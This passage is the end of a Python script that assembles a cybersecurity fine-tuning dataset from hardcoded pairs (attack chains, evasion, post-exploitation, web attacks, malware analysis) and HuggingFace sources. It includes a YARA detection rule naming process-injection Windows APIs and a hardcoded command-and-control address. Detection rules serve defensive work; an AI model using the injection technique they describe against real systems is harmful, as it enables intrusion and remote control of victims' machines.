            "rule RemoteThread_Injector_C2 {\n"
            "    meta:\n"
            "        description = \"Process injector with hardcoded C2 at 10.10.10.99\"\n"
            "        severity    = \"high\"\n\n"
            "    strings:\n"
            "        $c2       = \"10.10.10.99\" ascii wide\n"
            "        $api1     = \"CreateRemoteThread\" ascii\n"
            "        $api2     = \"VirtualAllocEx\" ascii\n"
            "        $api3     = \"WriteProcessMemory\" ascii\n"
            "        $api4     = \"OpenProcess\" ascii\n"
            "        $winapi   = \"WS2_32\" ascii nocase\n\n"
            "    condition:\n"
            "        uint16(0) == 0x5A4D and\n"
            "        filesize < 10MB and\n"
            "        $c2 and\n"
            "        2 of ($api1, $api2, $api3, $api4)\n"
            "}"
        ),
    ]


# =============================================================================
# Main
# =============================================================================

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Build USARE cybersecurity training dataset")
    parser.add_argument("--out", default="usare_dataset/cybersec_dataset.jsonl")
    parser.add_argument("--no-hf",  action="store_true", help="Skip HuggingFace datasets")
    # NVD args kept for compatibility but NVD is no longer used (blocked on cloud GPUs)
    parser.add_argument("--nvd-key",  default="", help="(Unused — NVD often blocked on cloud. Use HuggingFace instead.)")
    parser.add_argument("--max-cves", type=int, default=3000, help="(Unused)")
    args = parser.parse_args()

    if args.nvd_key:
        log.info("Note: NVD API is often blocked from cloud GPU providers. Using HuggingFace datasets instead.")

    samples = []

    # Hardcoded expert knowledge
    log.info("Building expert knowledge base...")
    samples += port_service_pairs()
    log.info(f"  Port/service: {len(samples)}")
    samples += attack_chain_pairs()
    log.info(f"  Attack chains: {len(samples)}")
    samples += evasion_pairs()
    log.info(f"  Evasion: {len(samples)}")
    samples += post_exploitation_pairs()
    log.info(f"  Post-exploitation: {len(samples)}")
    samples += web_attack_pairs()
    log.info(f"  Web attacks: {len(samples)}")
    samples += ctf_reasoning_pairs()
    log.info(f"  CTF reasoning: {len(samples)}")
    samples += malware_pairs()
    log.info(f"  Malware analysis: {len(samples)}")

    hardcoded_count = len(samples)

    # HuggingFace datasets
    if not args.no_hf:
        log.info("Loading HuggingFace cybersecurity datasets...")
        hf_samples = load_huggingface_datasets()
        samples += hf_samples
        log.info(f"  HuggingFace added: {len(hf_samples)} samples")

    random.shuffle(samples)

    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w") as f:
        for s in samples:
            f.write(json.dumps(s) + "\n")

    log.info(f"\n{'='*50}")
    log.info(f"Dataset complete!")
    log.info(f"  Hardcoded expert knowledge : {hardcoded_count}")
    log.info(f"  HuggingFace datasets       : {len(samples) - hardcoded_count}")
    log.info(f"  Total                      : {len(samples)}")
    log.info(f"  Saved to                   : {out_path}")
    log.info(f"{'='*50}")
    log.info("Next: python finetune/finetune_qwen_cybersec.py --stage train")


if __name__ == "__main__":
    main()
